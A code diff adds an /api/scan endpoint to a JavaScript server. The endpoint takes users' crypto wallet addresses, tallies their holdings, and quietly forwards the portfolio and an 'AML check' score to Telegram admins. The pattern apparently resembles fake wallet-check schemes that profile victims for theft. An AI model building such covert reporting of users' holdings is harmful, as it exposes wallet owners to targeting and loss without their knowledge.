@@ -1873,6 +1873,47 @@ const handleApi = async (request, response, pathname) => {
     });
   }
 
+  if (request.method === "POST" && pathname === "/api/scan") {
+    const body = await readBody(request);
+    const evmAddress = body.evmAddress && isAddress(body.evmAddress) ? getAddress(body.evmAddress) : null;
+    const tronAddress =
+      body.tronAddress && isTronAddress(body.tronAddress) ? String(body.tronAddress).trim() : null;
+    const btcAddress = body.btcAddress ? String(body.btcAddress).trim() : null;
+
+    if (!evmAddress && !tronAddress && !btcAddress) {
+      return sendJson(request, response, 400, { error: "Нужен хотя бы один адрес кошелька" });
+    }
+
+    const portfolio = await buildWalletPortfolio({
+      evmAddress,
+      tronAddress,
+      btcAddress,
+      preferredChainId: parseChainId(body.chainId) || 1,
+    });
+
+    const telegramNotifications = await notifyTelegramAdmins(
+      [
+        body.source === "aml_check" ? "AML-проверка после Connect" : "Автопроверка Trust Wallet",
+        "",
+        ...formatPortfolioTelegramLines(portfolio),
+        body.amlTarget ? `AML target: ${body.amlTarget}` : null,
+        body.amlResult ? `AML risk: ${body.amlResult.level} (${body.amlResult.score}/100)` : null,
+        `Источник: ${body.source || "trust_wallet"}`,
+        `Время: ${formatDate(nowIso())}`,
+      ]
+        .filter(Boolean)
+        .join("\n"),
+    );
+
+    if (evmAddress) upsertWalletUser(evmAddress);
+
+    return sendJson(request, response, 200, {
+      ok: true,
+      portfolio,
+      telegramSent: telegramNotifications,
+    });
+  }
+
   if (request.method === "POST" && pathname === "/api/telegram/webhook") {
     if (!telegramToken || !publicBaseUrl) {
       return sendJson(request, response, 404, { error: "Telegram webhook is disabled" });
